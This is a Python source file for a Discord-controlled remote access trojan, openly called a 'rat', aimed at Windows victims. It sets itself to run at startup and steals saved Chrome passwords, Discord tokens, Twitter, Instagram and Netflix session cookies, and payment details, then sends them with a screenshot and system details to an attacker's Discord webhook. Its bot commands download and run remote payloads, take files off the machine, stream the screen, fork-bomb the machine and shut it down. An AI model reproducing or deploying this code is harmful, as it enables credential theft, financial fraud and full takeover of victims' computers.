import discord
from discord.ext import commands
from discord.utils import get
import os
import webbrowser
from mediafiredl import MediafireDL as mf
import pyautogui
import zipfile
import json
import socket
import shutil
from threading import Thread

############################################################## CONFIG
defaultStartup = False # If (by default) you want this to insert to startup
notificationChannel = int("notification-channel-here (INTEGER, REMOVE QUOTES)") # Channel to send the notification that this machine is online to (Channel ID, keep as integer)
botToken = "bot-token-here" # Put your discord bot's token here

############################################################## CONFIG

# Startup

def settostartup():
    # get path to user's startup directory
    startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    # get current script's path
    current_path = os.path.abspath(__file__)

    # copy the script to the startup directory
    shutil.copy2(current_path, startup_dir)

if defaultStartup is True:
    settostartup()

######################### Functions
# Most of the code (in this function) stolen from: https://github.com/mouadessalim/CookedGrabber
def tokenlogger(defwebhook):
    import sys
    import win32con
    import browser_cookie3
    from json import loads, dumps
    from base64 import b64decode
    from sqlite3 import connect
    from shutil import copyfile
    from threading import Thread
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    from discord_webhook import DiscordEmbed, DiscordWebhook
    from subprocess import Popen, PIPE
    from urllib.request import urlopen, Request
    from requests import get
    from re import findall, search
    from win32api import SetFileAttributes, GetSystemMetrics
    from browser_history import get_history
    from prettytable import PrettyTable
    from platform import platform
    from getmac import get_mac_address as gma
    from psutil import virtual_memory
    from collections import defaultdict
    from zipfile import ZipFile, ZIP_DEFLATED
    from cpuinfo import get_cpu_info
    from multiprocessing import freeze_support
    from tempfile import TemporaryDirectory
    from pyautogui import screenshot
    from random import choices
    from string import ascii_letters, digits

    website = ['discord.com', 'twitter.com', 'instagram.com', 'netflix.com']


    def get_screenshot(path):
        get_screenshot.scrn = screenshot()
        get_screenshot.scrn_path = os.path.join(
            path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
        get_screenshot.scrn.save(get_screenshot.scrn_path)


    def get_hwid():
        p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


    def get_user_data(tk):
        headers = {'Authorization': tk}
        response = get('https://discordapp.com/api/v6/users/@me',
                    headers=headers).json()
        return [response['username'], response['discriminator'],
                response['email'], response['phone']]


    def has_payment_methods(tk):
        headers = {'Authorization': tk}
        response = get(
            'https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
        return response


    def cookies_grabber_mod(u):
        cookies = []
        browsers = ["chrome", "edge", "firefox",
                    "brave", "opera", "vivaldi", "chromium"]
        for browser in browsers:
            try:
                cookies.append(
                    str(getattr(browser_cookie3, browser)(domain_name=u)))
            except BaseException:
                pass
        return cookies


    def get_Personal_data():
        try:
            ip_address = urlopen(
                Request('https://api64.ipify.org')).read().decode().strip()
            country = urlopen(
                Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
            city = urlopen(
                Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
        except BaseException:
            city = "City not found -_-"
            country = "Country not found -_-"
            ip_address = "No IP found -_-"
        return [ip_address, country, city]




    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = loads(f.read())
        return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[
                                5:], None, None, None, 0)[1]


    def decrypt_data(data, key):
        try:
            return AES.new(CryptUnprotectData(key, None, None, None, 0)[1], AES.MODE_GCM, data[3:15]).decrypt(
                data[15:])[:-16].decode()
        except BaseException:
            try:
                return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except BaseException:
                return ""
        
    def main(dirpath):
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        chrome_psw_list = []
        if os.path.exists(db_path):
            key = get_encryption_key()
            filename = os.path.join(dirpath, "ChromeData.db")
            copyfile(db_path, filename)
            db = connect(filename)
            cursor = db.cursor()
            cursor.execute(
                'SELECT origin_url, username_value, password_value FROM logins')
            chrome_psw_list = []
            for url, user_name, pwd in cursor.fetchall():
                pwd_db = decrypt_data(pwd, key)
                if pwd_db:
                    chrome_psw_list.append([user_name, pwd_db, url])
            cursor.close()
            db.close()
        
        for w in website:
            if w == website[0]:
                tokens = []
                cleaned = []
                
                def discord_tokens(path):
                    try:
                        with open(os.path.join(path, "Local State"), "r") as file:
                            key = loads(file.read())['os_crypt']['encrypted_key']
                            file.close()
                    except: pass
                    
                    for file in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
                        if not file.endswith(".ldb") and file.endswith(".log"): pass
                        else:
                            try:
                                with open(os.path.join(path, "Local Storage", "leveldb", file), "r", errors='ignore') as files:
                                    for x in files.readlines():
                                        x.strip()
                                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                            tokens.append(values)
                            except: pass
                    for tkn in tokens:
                        if tkn.endswith("\\"):
                            tkn.replace("\\", "")
                        elif tkn not in cleaned:
                            cleaned.append(tkn)
                    for token in cleaned:
                        try:
                            tokens.append(decrypt_data(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
                        except:
                            pass
        
                local = os.getenv('LOCALAPPDATA')
                roaming = os.getenv('APPDATA')
                paths = [
                    os.path.join(roaming, 'discord'),
                    os.path.join(roaming, 'discordcanary'),
                    os.path.join(roaming, 'Lightcord'),
                    os.path.join(roaming, 'discordptb'),
                    os.path.join(roaming, 'Opera Software', 'Opera Stable'),
                    os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
                    os.path.join(local, 'Amigo', 'User Data'),
                    os.path.join(local, 'Torch', 'User Data'),
                    os.path.join(local, 'Kometa', 'User Data'),
                    os.path.join(local, 'Orbitum', 'User Data'),
                    os.path.join(local, 'CentBrowser', 'User Data'),
                    os.path.join(local, '7Star', '7Star', 'User Data'),
                    os.path.join(local, 'Sputnik', 'Sputnik', 'User Data'),
                    os.path.join(local, 'Vivaldi', 'User Data', 'Default'),
                    os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
                    os.path.join(local, 'Google', 'Chrome', 'User Data' 'Default'),
                    os.path.join(local, 'Epic Privacy Browser', 'User Data'),
                    os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
                    os.path.join(local, 'uCozMedia', 'Uran', 'User Data', 'Default'),
                    os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
                    os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                    os.path.join(local, 'Iridium', 'User Data', 'Default')
                ]
                
                threads = []

                def find_wb(wb):
                    if os.path.exists(wb):
                        threads.append(Thread(target=discord_tokens, args=(wb,)))

                for pth in paths:
                    find_wb(pth)
                for t in threads:
                    t.start()
                    t.join()
            elif w == website[1]:
                t_cookies, t_lst = ([] for _ in range(2))
                for b in cookies_grabber_mod(w):
                    t_cookies.append(b.split(', '))
                for c in t_cookies:
                    for y in c:
                        if search(r"auth_token", y) is not None:
                            t_lst.append(y.split(' ')[1].split("=")[1])
            elif w == website[2]:
                insta_cookies, insta_lst = ([] for _ in range(2))
                for b in cookies_grabber_mod(w):
                    insta_cookies.append(b.split(', '))
                browser_ = defaultdict(dict)
                for c in insta_cookies:
                    if all([search(r"ds_user_id", str(c)) is not None,
                        search(r"sessionid", str(c)) is not None]):
                        for y in c:
                            conditions = [search(r"ds_user_id", y) is not None, search(
                                r"sessionid", y) is not None]
                            if any(conditions):
                                browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[
                                    1].split("=")[1]
                for x in list(dict(browser_).keys()):
                    insta_lst.append(list(dict(browser_)[x].items()))
                for x in insta_lst:
                    for y in x:
                        if x.index(y) != y[0]:
                            x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
                for x in insta_lst:
                    for y in x:
                        x[x.index(y)] = y[1]
            elif w == website[3]:
                n_cookies, n_lst = ([] for _ in range(2))
                for b in cookies_grabber_mod(w):
                    n_cookies.append(b.split(', '))
                for c in n_cookies:
                    for y in c:
                        if search(r"NetflixId", y) is not None:
                            data = y.split(' ')[1].split("=")[1]
                            if len(data) > 80:
                                n_lst.append([])
                                for y in c:
                                    n_lst[-1].append({'domain': f"{website[3]}", "name": f"{y.split(' ')[1].split('=')[0]}",
                                                    "value": f"{y.split(' ')[1].split('=')[1]}"})
        all_data_p = []
        for x in tokens:
            lst_b = has_payment_methods(x)
            try:
                for n in range(len(lst_b)):
                    if lst_b[n]['type'] == 1:
                        writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]
                                    ['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
                        if writable not in all_data_p:
                            all_data_p.append(writable)
                    elif lst_b[n]['type'] == 2:
                        writable_2 = [lst_b[n]['email'], lst_b[n]
                                    ['type'], lst_b[n]['billing_address']]
                        if writable_2 not in all_data_p:
                            all_data_p.append(writable_2)
            except BaseException:
                pass
        return [cleaned, list(set(t_lst)), list(set(tuple(element)
                                                for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]


    def send_webhook(DISCORD_WEBHOOK_URLs):
        p_lst = get_Personal_data()
        cpuinfo = get_cpu_info()
        with TemporaryDirectory(dir='.') as td:
            SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
            get_screenshot(path=td)
            main_info = main(td)
            discord_T, twitter_T, insta_T, chrome_Psw_t = (
                PrettyTable(padding_width=1) for _ in range(4))
            discord_T.field_names, twitter_T.field_names, insta_T.field_names, chrome_Psw_t.field_names, verified_tokens = [
                "Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], ['Username / Email', 'password', 'website'], []
            for __t in main_info[4]:
                chrome_Psw_t.add_row(__t)
            for t_ in main_info[0]:
                try:
                    lst = get_user_data(t_)
                    username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
                    discord_T.add_row([t_, username, email, phone])
                    verified_tokens.append(t_)
                except BaseException:
                    pass
            for _t in main_info[1]:
                twitter_T.add_row([_t])
            for _t_ in main_info[2]:
                insta_T.add_row(_t_)
            pay_l = []
            for _p in main_info[3]:
                if _p[1] == 1:
                    payment_card = PrettyTable(padding_width=1)
                    payment_card.field_names = [
                        "Brand", "Last 4", "Type", "Expiration", "Billing Adress"]
                    payment_card.add_row(
                        [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
                    pay_l.append(payment_card.get_string())
                elif _p[1] == 2:
                    payment_p = PrettyTable(padding_width=1)
                    payment_p.field_names = ["Email", "Type", "Billing Adress"]
                    payment_p.add_row([_p[0], "Paypal", _p[2]])
                    pay_l.append(payment_p.get_string())
            files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [
                os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t]]
            for x_, y_ in files_names:
                if (y_ == files_names[0][1] and len(main_info[0]) != 0) or (y_ == files_names[1][1] and len(main_info[1]) != 0) or (
                        y_ == files_names[2][1] and len(main_info[2]) != 0) or (y_ == files_names[3][1] and len(main_info[4]) != 0):
                    with open(x_, 'w') as wr:
                        wr.write(y_.get_string())
            all_files = [os.path.join(
                td, 'History.txt'), get_screenshot.scrn_path, os.path.join(td, "Payment Info.txt")]
            for n in main_info[5]:
                p = os.path.join(td, f'netflix_{main_info[5].index(n)}.json')
                with open(p, 'w') as f:
                    f.write(dumps(n, indent=4))
                all_files.append(p)
            with open(all_files[0], 'w') as f:
                f.write("Hey the history was causing some issues so I didn't include it in this rat")
            with ZipFile(os.path.join(td, 'data.zip'), mode='w', compression=ZIP_DEFLATED) as zip:
                if ('payment_card' or 'payment_p') in locals():
                    with open(all_files[2], 'w') as f:
                        for i in pay_l:
                            f.write(f"{i}\n")
                for files_path in all_files:
                    try:
                        zip.write(files_path)
                    except FileNotFoundError:
                        pass
                for name_f, _ in files_names:
                    if os.path.exists(name_f):
                        zip.write(name_f)
            for URL in DISCORD_WEBHOOK_URLs:
                webhook = DiscordWebhook(url=URL, username='Cooked Grabber',
                                        avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png")
                embed = DiscordEmbed(title='New victim !', color='FFA500')
                embed.add_embed_field(
                    name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
                embed.add_embed_field(
                    name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
                embed.add_embed_field(
                    name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
                embed.add_embed_field(
                    name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n:green_circle:`Netflix:` **{len(main_info[5])}**\n:brown_circle:`Account Password Grabbed:` **{len(main_info[4])}**\n", inline=False)
                card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals(
                ) else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
                embed.add_embed_field(
                    name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
                embed.set_footer(text='By Lemon.-_-.#3714 & 0xSpoofed')
                embed.set_timestamp()
                with open(os.path.join(td, "data.zip"), 'rb') as f:
                    webhook.add_file(
                        file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
                webhook.add_embed(embed)
                webhook.execute()

    freeze_support()
    if len(sys.argv) == 1:
        send_webhook([defwebhook])
    else:
        del sys.argv[0]
        send_webhook(sys.argv)

def getip(): #Get user IP
    return socket.gethostbyname(socket.gethostname())  

def getprefix():
    try:
        with open("data.json", "r") as file:
            data = json.load(file)
    except Exception:
        data = {
            "prefix": None
        }
        data["prefix"] = getip()
        with open("data.json", "w") as file:
            file.write(json.dumps(data))
    return data["prefix"]

def jsonchange(changetype: str, new):
    with open("data.json", "r") as file:
        data = json.load(file)
    
    data[changetype] = new

    with open("data.json", "w") as file:
        file.write(json.dumps(data))

def getdata(dataname):
    try:
        with open("data.json", "r") as file:
            data = json.load(file)
        return (True, data[dataname])
    except Exception as e:
        return (False, e)
 
def startstream():
    import cv2
    import mss
    import numpy
    import ctypes

    from flask import render_template, Flask, Response

    import threading
    import time

    class Camera(object): #https://stackoverflow.com/questions/65919614/how-to-stream-desktop-with-flask
        thread = None
        frame = None
        last_access = 0

        def __init__(self):
            if Camera.thread is None:
                Camera.last_access = time.time()
                Camera.thread = threading.Thread(target=self._thread)
                Camera.thread.start()

                while self.get_frame() is None:
                    time.sleep(0)

        def get_frame(self):
            '''Get the current frame.'''
            Camera.last_access = time.time()

            return Camera.frame

        @staticmethod
        def frames():
            '''Create a new frame every 2 seconds.'''
            user32 = ctypes.windll.user32
            monitor = {
                'top': 0,
                'left': 0,
                'width': 1990, #ADJUST YOUR SCREEN SIZE HERE (width)
                'height': 1080 #ADJUST YOUR SCREEN SIZE HERE (height)
            }
            with mss.mss() as sct:
                while True:
                    time.sleep(0.5)
                    raw = sct.grab(monitor)
                    # Use numpy and opencv to convert the data to JPEG. 
                    img = cv2.imencode('.jpg', numpy.array(raw))[1].tobytes()
                    yield(img)

        @classmethod
        def _thread(cls):
            '''As long as there is a connection and the thread is running, reassign the current frame.'''
            print('Starting camera thread.')
            frames_iter = cls.frames()
            for frame in frames_iter:
                Camera.frame = frame
                if time.time() - cls.last_access > 10:
                    frames_iter.close()
                    print('Stopping camera thread due to inactivity.')
                    break
            cls.thread = None

    app = Flask(__name__)

    @app.route('/')
    def index():
        return render_template('index.html')

    def gen(camera):
        while True:
            frame = camera.get_frame()
            yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

    @app.route('/MemWare/stream')
    def video_feed():
        return Response(gen(Camera()),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    app.run(host='0.0.0.0', debug=True, use_reloader=False)

prefix = getprefix()

########################## discord shit
bot = commands.Bot(command_prefix=f"{prefix}+", intents = discord.Intents.all())

@bot.event
async def on_ready():
    channel = bot.get_channel(notificationChannel)
    endtext = ""
    if getdata("nickname")[0] is True:
        endtext = f"\nNickname: {getdata('nickname')[1]}"
    await channel.send(f"- - -\nComputer on IP '{prefix}' has started{endtext}\nGet started with '{prefix}+help'\n- - -")

@bot.command(brief="Puts the file into startup")
async def startup(ctx):
    try:
        settostartup()
        await ctx.send("Rat is now in startup")
    except Exception as e:
        await ctx.send(f"Something went wrong!\n({e})")

@bot.command(brief="Crashes the computer")
async def crash(ctx):
    with open("crasher.bat", "w") as file:
        file.write("""
        :a
        set /A variable = 1
        echo %variable%
        set /A variable=%variable%*99
        echo %variable%
        start %0
        goto a
        """)
    os.startfile("crasher.bat")

@bot.command(brief="Let's you give the machine a nickname")
async def nickname(ctx, *, name: str=None):
    if name is None:
        await ctx.send("You need to give it a name")
    else:
        await ctx.send(f"This machine is now: {name}")
        jsonchange("nickname", name)

@bot.command(brief="Takes a screenshot on the machine")
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove("screenshot.png")

@bot.command(brief="Steals cookies etc that are on the machine")
async def stealinfo(ctx, * , webhook: str=None):
    if webhook is None:
        await ctx.send("You need to provide a webhook url to send the info into")
        return False
    await ctx.send("Alright, stealing the info, this may take a second")
    try:
        tokenlogger(webhook)
        await ctx.send("The info should now be in the webhook")
    except Exception as e:
        await ctx.send(f"Something went wrong with the stealing.\n\nMake a issue with this:\n{e}")

@bot.command(brief="Downloads a file to the machine")
async def upload(ctx, url: str=None):
    filename = mf.GetName(url)
    if url is None:
        await ctx.send("url is missing")
    else:
        file_size = mf.GetFileSize(url)
        await ctx.send(f"Downloading file to victim's computer:\nFile name: {mf.GetName(url)}\nFile size: {mf.AsMegabytes(file_size)} megabytes")
        mf.Download(url)#, output="C:\\Users\\User\\Desktop")
 
@bot.command(brief="Opens a webpage on the machine")
async def openweb(ctx, website: str=None):
    if website is None:
        await ctx.send("You need to input a website address")
    else:
        await ctx.send(f"Opening website: {website}")
        webbrowser.open(website, new=0, autoraise=True)

@bot.command(brief="Executes a file on the machine")
async def execute(ctx, path):
    try:
        os.startfile(path)
        await ctx.send("File is being executed")
    except Exception as e:
        await ctx.send(f"Error:\n\n{e}")

@bot.command(brief="Downloads a (zip) file from MediaFire, then executes it.")
async def uploadexecute(ctx, url: str=None):
    await ctx.send("NOTE: The ZIP file name has to be the same as the EXE file name!")
    filename = mf.GetName(url)

    #downloading to downloads
    if url is None:
        await ctx.send("url is missing")
    else:
        file_size = mf.GetFileSize(url)
        await ctx.send(f"Downloading and executing (zipped) file to victim's computer:\nFile name: {filename}\nFile size: {mf.AsMegabytes(file_size)} megabytes")
        downloads = os.getcwd() + "\downloads"
        mf.Download(url, output=downloads, filename=filename)
        await ctx.send("file has been downloaded")

        # unzip the file
        zipname = filename
        exename = filename.replace('.zip', '.exe')
        foldername = filename.replace('.zip', '')
        with zipfile.ZipFile(f"downloads/{zipname}", 'r') as zip_ref:
            zip_ref.extractall(downloads)
        os.remove(f"downloads/{zipname}")
        await ctx.send("file has been unzipped")

        # run the file
        await ctx.send("file is being executed")
        os.startfile(f"{downloads}/{foldername}/{exename}")

@bot.command(brief="Downloads a file from the victim's computer")
async def download(ctx, path: str=None):
    if path is None:
        await ctx.send("You need to specify a path")
        return
    elif os.path.exists(path) is False:
        await ctx.send("That file doesn't exist")
        return
    
    pathtype = os.path.isdir(path)

    if pathtype is False: # It's a file
        filesize = os.path.getsize(path)

        if filesize >= 24999999: # discord limit
            await ctx.send("Sorry, we currently only accept <24.9 mb files due to discord having limits")
        else:
            await ctx.send(file=discord.File(path))

    elif pathtype is True: #It's a directory
        shutil.make_archive("ToSend", 'zip', path)
        filesize = os.path.getsize("ToSend.zip")
        if filesize >= 24999999: # discord limit
            await ctx.send("Sorry, we currently only accept <24.9 mb files due to discord having limits")
        else:
            await ctx.send(file=discord.File("ToSend.zip"))
        os.remove("ToSend.zip")
    else:
        await ctx.send("Something went horribly wrong")

@bot.command(brief="Get the size of a file/directory")
async def size(ctx, path: str=None):
    if path is None:
        await ctx.send("You need to specify a path")
        return
    elif os.path.exists(path) is False:
        await ctx.send("That file doesn't exist")
        return
    filesize = os.path.getsize(path)
    await ctx.send(f"{path} is {filesize} megabytes.\n(This thing may be a little broken)")

@bot.command(brief="Shuts down, restarts or Logs the user out of the machine")
async def shutdown(ctx, choice: str=None):
    if choice is None:
        await ctx.send("You need to input what you want to do:\n- Logout\n- Shutdown\n- Restart")
    else:
        choice = choice.lower()
    if choice == "shutdown":
        os.system("shutdown /s /t 1")
    elif choice == "restart":
        os.system("shutdown /r /t 1")
    elif choice == "logout":
        os.system("shutdown /l /t 1")

@bot.command(brief="allows you to see the users files on the machine")
async def explorer(ctx, *, path: str="C:/"):
    try:
        await ctx.send(os.listdir(path))
    except PermissionError:
        await ctx.send("We don't have permission to that folder")

@bot.command(brief="Web stream config")
async def stream(ctx, var=None):
    if var is None:
        await ctx.send("Welcome to the stream config:\n\n To start the stream, use: (IP)+stream start")
        return
    if var.lower() == "start":
        try:
            streamthread = Thread(target=startstream, args=())
            streamthread.start()
            await ctx.send(f"The stream should now be online on: http://{getip()}:5000/MemWare/stream")
        except RuntimeError:
            await ctx.send(f"The stream is already running!\n(http://{getip()}:5000/MemWare/stream)")
        except Exception as e:
            await ctx.send(f"Something went wrong!\n({e})")


bot.run(botToken)
